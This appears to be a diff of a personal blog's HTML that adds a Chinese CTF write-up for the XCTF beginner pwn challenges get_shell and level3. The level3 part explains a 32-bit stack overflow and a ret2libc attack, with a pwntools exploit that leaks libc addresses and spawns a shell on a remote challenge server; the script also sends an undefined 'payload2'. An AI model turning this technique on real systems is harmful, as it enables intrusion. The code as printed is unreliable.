@@ -6,16 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>HandsomeJack</title>
+  <title>攻防世界新手区get_shell、level3 | HandsomeJack</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="一天一道坑题，头发远离我">
-<meta property="og:type" content="website">
-<meta property="og:title" content="HandsomeJack">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;index.html">
+  <meta name="description" content="[攻防世界]新手区get_shell和level3get_shell先说这个神奇的get_shell题，我实在想不明白为什么这道题可以值7分，我还以为是新手区的压轴题，万万没想到，它真就如题所说的那样，“运行就能拿到shell呢，真的”IDA：">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界新手区get_shell、level3">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;07&#x2F;level3&#x2F;index.html">
 <meta property="og:site_name" content="HandsomeJack">
-<meta property="og:description" content="一天一道坑题，头发远离我">
+<meta property="og:description" content="[攻防世界]新手区get_shell和level3get_shell先说这个神奇的get_shell题，我实在想不明白为什么这道题可以值7分，我还以为是新手区的压轴题，万万没想到，它真就如题所说的那样，“运行就能拿到shell呢，真的”IDA：">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;07&#x2F;level3&#x2F;a.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;07&#x2F;level3&#x2F;b.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;07&#x2F;level3&#x2F;c.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;07&#x2F;level3&#x2F;d.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;07&#x2F;level3&#x2F;f.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;07&#x2F;level3&#x2F;g.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;07&#x2F;level3&#x2F;h.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;07&#x2F;level3&#x2F;i.png">
+<meta property="og:updated_time" content="2020-02-07T04:25:30.639Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;07&#x2F;level3&#x2F;a.png">
   
     <link rel="alternative" href="/atom.xml" title="HandsomeJack" type="application/atom+xml">
   
@@ -180,16 +191,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-level3" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-level3" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/02/07/level3/">攻防世界新手区get_shell、level3</a>
+    <h1 class="article-title" itemprop="name">
+      攻防世界新手区get_shell、level3
     </h1>
   
 
@@ -204,11 +213,64 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="攻防世界-新手区get-shell和level3"><a href="#攻防世界-新手区get-shell和level3" class="headerlink" title="[攻防世界]新手区get_shell和level3"></a>[攻防世界]新手区get_shell和level3</h1><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h2><p>先说这个神奇的get_shell题，我实在想不明白为什么这道题可以值7分，我还以为是新手区的压轴题，万万没想到，它真就如题所说的那样，“运行就能拿到shell呢，真的”<br>IDA：<br><img src="a.png" alt="真没啥可说的，运行即可"></p>
-        
-          <a class="article-more-a" href="/2020/02/07/level3/#more">more >></a>
-        
+<a id="more"></a>
+<p>这个真的是运行就能拿到flag。。没任何坑</p>
+<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>这个题，拿到文件以后还给了个libc，估计是要自己计算system地址。<br>先查看文件信息及保护措施<br><img src="b.png" alt=""><br>32为IDA打开<br><img src="c.png" alt=""><br>既没有system，也没有/bin/sh或cat flag，但是有read和write，所以可以利用write泄露libc中system地址，并找到’/bin/sh’让system调用<br><img src="d.png" alt=""><br>接下来计算溢出需要的偏移，用gdb的pattern脚本生成200个字符，运行level3程序，直接输入200个字符<br><img src="f.png" alt=""><br>查看溢出点<br><img src="g.png" alt=""><br>利用pattern offset计算需要填充的字符数<br><img src="h.png" alt=""><br>即’a’*140</p>
+<h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><ol>
+<li>因为libc开着地址随机化，所以偏移会变化，必须在同一次运行内进行两次攻击，确保offset不变</li>
+<li>第一次攻击，利用write函数，泄露其真实地址，通过计算得到libc加载的基地址</li>
+<li>已知libc的基地址，计算system的真实地址和字符串’/bin/sh’的真实地址</li>
+<li>第二次攻击，构造system(“/bin/sh”)，拿到shell</li>
+<li>拿到flag<h3 id="计算公式："><a href="#计算公式：" class="headerlink" title="计算公式："></a>计算公式：</h3></li>
+</ol>
+<p><strong>libc加载的基地址 = write真实地址 - write在libc中的偏移量<br>system真实地址  = libc加载的基地址 + system在libc中的偏移量<br>/bin/sh真实地址 = libc加载的基地址 + /bin/sh在libc中的偏移量</strong></p>
+<p>其中 “/bin/sh在libc中的偏移量” 不知道为啥我用search查不到，所以我用winhex打开了libc，搜索字符串，得到0x159020+0xb，即0x15902b<br><img src="i.png" alt=""></p>
+<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./level3'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"> </span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'111.198.29.45'</span>,<span class="number">30808</span>)</span><br><span class="line"></span><br><span class="line">payload0 = <span class="string">'a'</span>*<span class="number">140</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"Input:\n"</span>,payload0)  <span class="comment">#第一次攻击</span></span><br><span class="line"></span><br><span class="line">write_got_addr = u32(sh.recv()[:<span class="number">4</span>])<span class="comment">#得到write函数的真实地址，32位收到的包长4位，所以用[:4]</span></span><br><span class="line"></span><br><span class="line">libc_addr = write_got_addr - libc.symbols[<span class="string">'write'</span>]  <span class="comment">#计算libc加载的基地址</span></span><br><span class="line">sys_addr = libc_addr + libc.symbols[<span class="string">'system'</span>]  <span class="comment">#计算system函数真实地址</span></span><br><span class="line">bin_sh_addr = libc_addr + <span class="number">0x15902b</span>  <span class="comment">#计算'/bin/sh'真实地址，这个0x15902b就是/bin/sh在libc中的偏移量</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">140</span> + p32(sys_addr) + p32(<span class="number">0x1234</span>) + p32(bin_sh_addr)</span><br><span class="line">sh.sendline(payload2)  <span class="comment">#第二次攻击</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>payload0解释：</p>
+<ol>
+<li>‘a’*140：用于填充，使栈溢出，上文用pattern offset计算出140</li>
+<li>p32(write_plt)：write在plt表中的地址，让read完后进入write</li>
+<li>p32(main_addr)：main函数地址，是write函数的返回地址，让write执行完后，返回main函数，这样就能进行第二次攻击</li>
+<li>p32(1)：write函数的第一个参数</li>
+<li>p32(write_got)：write函数的第二个参数，此为write要泄露的自身真实地址</li>
+<li>p32(4)：write函数的第三个参数</li>
+</ol>
+<p>payload1解释：</p>
+<ol>
+<li>‘a’*140：用于填充，使栈溢出，上文用pattern offset计算出140</li>
+<li>p32(sys_addr)：system的真实地址，让read完后进入system</li>
+<li>p32(0x1234)：随便填充一个system的返回地址</li>
+<li>p32(bin_sh_addr)：bin/sh的地址，当system参数</li>
+</ol>
+
       
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/weixin.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -228,16 +290,75 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/02/07/level3/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/02/07/level3/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2020/02/02/guess_num/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">攻防世界新手区guess_num</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -252,629 +373,48 @@
         </div>
         
         
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-guess_num" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/02/02/guess_num/">攻防世界新手区guess_num</a>
-    </h1>
-  
-
-        
-        <a href="/2020/02/02/guess_num/" class="archive-article-date">
-  	<time datetime="2020-02-02T10:08:39.741Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-02</time>
-</a>
-        
-      </header>
-<div align="center" class="post-count">字数：582字 | 预计阅读时长：2分钟</div>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="攻防世界-新手区guess-num"><a href="#攻防世界-新手区guess-num" class="headerlink" title="[攻防世界]新手区guess_num"></a>[攻防世界]新手区guess_num</h1><p>运行了一下发现是个猜数的游戏，还是先看文件属性及保护措施<br><img src="a.png" alt="checksec检查文件"><br>64位文件用64IDA打开，先看字符串窗口，找可利用的字符串</p>
-        
-          <a class="article-more-a" href="/2020/02/02/guess_num/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/02/02/guess_num/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#攻防世界-新手区get-shell和level3"><span class="toc-number">1.</span> <span class="toc-text">[攻防世界]新手区get_shell和level3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">1.1.</span> <span class="toc-text">get_shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3"><span class="toc-number">1.2.</span> <span class="toc-text">level3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#思路："><span class="toc-number">1.2.1.</span> <span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#计算公式："><span class="toc-number">1.2.2.</span> <span class="toc-text">计算公式：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP："><span class="toc-number">1.2.3.</span> <span class="toc-text">EXP：</span></a></li></ol></li></ol></li></ol>
+                    </div>
+                </span>
             </div>
         </div>
         
-        
     </div>
 </aside>
 
 
 
-
   
-    <article id="post-when_did_you_born" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/02/02/when_did_you_born/">攻防世界新手区when_did_you_born</a>
-    </h1>
   
 
-        
-        <a href="/2020/02/02/when_did_you_born/" class="archive-article-date">
-  	<time datetime="2020-02-02T05:35:50.625Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-02</time>
-</a>
-        
-      </header>
-<div align="center" class="post-count">字数：425字 | 预计阅读时长：1分钟</div>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="攻防世界-新手区when-did-you-born"><a href="#攻防世界-新手区when-did-you-born" class="headerlink" title="[攻防世界]新手区when_did_you_born"></a>[攻防世界]新手区when_did_you_born</h1><p>还是先看文件信息及防护措施<br><img src="a.png" alt="checksec检查文件"><br>64位文件用64IDA打开，先看字符串窗口，找可利用的字符串</p>
-        
-          <a class="article-more-a" href="/2020/02/02/when_did_you_born/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/02/02/when_did_you_born/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-cgpwn2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/02/02/cgpwn2/">攻防世界新手区cgpwn2</a>
-    </h1>
   
 
-        
-        <a href="/2020/02/02/cgpwn2/" class="archive-article-date">
-  	<time datetime="2020-02-02T02:11:38.661Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-02</time>
-</a>
-        
-      </header>
-<div align="center" class="post-count">字数：457字 | 预计阅读时长：1分钟</div>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="攻防世界-新手区cgpwn2"><a href="#攻防世界-新手区cgpwn2" class="headerlink" title="[攻防世界]新手区cgpwn2"></a>[攻防世界]新手区cgpwn2</h1><p>依旧，先看文件属性信息，得知是个32位程序，且只开了NX<br><img src="a.png" alt="checksec查看信息"><br>拖进32位IDA，先看字符串窗口，找有无可利用的字符串。</p>
-        
-          <a class="article-more-a" href="/2020/02/02/cgpwn2/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/02/02/cgpwn2/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-int_overflow" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/02/01/int_overflow/">攻防世界新手区int_overflow</a>
-    </h1>
   
 
-        
-        <a href="/2020/02/01/int_overflow/" class="archive-article-date">
-  	<time datetime="2020-02-01T02:48:56.302Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-01</time>
-</a>
-        
-      </header>
-<div align="center" class="post-count">字数：794字 | 预计阅读时长：3分钟</div>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="攻防世界-新手区int-overflow"><a href="#攻防世界-新手区int-overflow" class="headerlink" title="[攻防世界]新手区int_overflow"></a>[攻防世界]新手区int_overflow</h1><p>这个题，题目提示很明显，往整数溢出方向想<br>先查看文件基本信息，得知是32位程序，且没有canary和PIE<br><img src="a.png" alt="先checksec查看"><br>然后看看字符串窗口，看有没有可以利用的字符串，发现system和cat flag，且存在一些需要留意的高危函数，strcpy和read。</p>
-        
-          <a class="article-more-a" href="/2020/02/01/int_overflow/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/02/01/int_overflow/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
-    <article id="post-level2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/01/31/level2/">攻防世界新手区level2</a>
-    </h1>
-  
-
-        
-        <a href="/2020/01/31/level2/" class="archive-article-date">
-  	<time datetime="2020-01-31T05:41:19.167Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-31</time>
-</a>
-        
-      </header>
-<div align="center" class="post-count">字数：390字 | 预计阅读时长：1分钟</div>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="攻防世界-新手区level2"><a href="#攻防世界-新手区level2" class="headerlink" title="[攻防世界]新手区level2"></a>[攻防世界]新手区level2</h1><p>先看文件属性，知道是32位程序<br><img src="z.png" alt="先checksec查看文件"></p>
-        
-          <a class="article-more-a" href="/2020/01/31/level2/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/01/31/level2/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-hello_pwn" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/01/31/hello_pwn/">攻防世界新手区hello_pwn</a>
-    </h1>
-  
-
-        
-        <a href="/2020/01/31/hello_pwn/" class="archive-article-date">
-  	<time datetime="2020-01-31T02:27:26.490Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-31</time>
-</a>
-        
-      </header>
-<div align="center" class="post-count">字数：204字 | 预计阅读时长：1分钟</div>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="攻防世界-新手区hello-pwn"><a href="#攻防世界-新手区hello-pwn" class="headerlink" title="[攻防世界]新手区hello_pwn"></a>[攻防世界]新手区hello_pwn</h1><p>先放进linux里看一下有无保护<br><img src="a.png" alt="先checksec一下"></p>
-        
-          <a class="article-more-a" href="/2020/01/31/hello_pwn/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/01/31/hello_pwn/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-test" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/01/18/test/">第一次用Markdown</a>
-    </h1>
-  
-
-        
-        <a href="/2020/01/18/test/" class="archive-article-date">
-  	<time datetime="2020-01-18T06:20:00.134Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-18</time>
-</a>
-        
-      </header>
-<div align="center" class="post-count">字数：112字 | 预计阅读时长：1分钟</div>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="我就试试"><a href="#我就试试" class="headerlink" title="我就试试"></a>我就试试</h1><h2 id="先试试字体"><a href="#先试试字体" class="headerlink" title="先试试字体"></a>先试试字体</h2><p><em>我是斜体</em><br><strong>我是粗体</strong><br><strong><em>我是又斜又粗的体</em></strong></p>
-        
-          <a class="article-more-a" href="/2020/01/18/test/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/01/18/test/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/11/01/hello-world/">Hello World</a>
-    </h1>
-  
-
-        
-        <a href="/2019/11/01/hello-world/" class="archive-article-date">
-  	<time datetime="2019-11-01T05:58:49.047Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-01</time>
-</a>
-        
-      </header>
-<div align="center" class="post-count">字数：73字 | 预计阅读时长：1分钟</div>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-        
-          <a class="article-more-a" href="/2019/11/01/hello-world/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/11/01/hello-world/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
